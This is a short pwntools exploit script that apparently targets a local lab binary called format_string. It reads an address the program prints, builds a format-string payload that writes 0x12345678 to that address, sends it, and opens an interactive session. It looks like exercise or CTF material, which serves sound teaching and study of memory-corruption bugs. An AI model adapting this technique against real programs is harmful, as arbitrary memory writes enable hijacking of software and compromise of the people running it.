from pwn import *

# set binary path
context.binary = "../build/format_string"
elf = context.binary

sh = process()

# get target address
address_prompt = sh.recvuntil("address:".encode())
print(address_prompt.decode())
target_addr = int(sh.recvline().decode(), 16)
print("received address:", hex(target_addr))

# get prompt text
text = sh.recvuntil("input:".encode())
print("prompt: ", text.decode())

# send payload
address_dict = {target_addr: 0x12345678}
payload = fmtstr_payload(8, address_dict, numbwritten=0, write_size="byte")

sh.sendline(payload)

sh.interactive()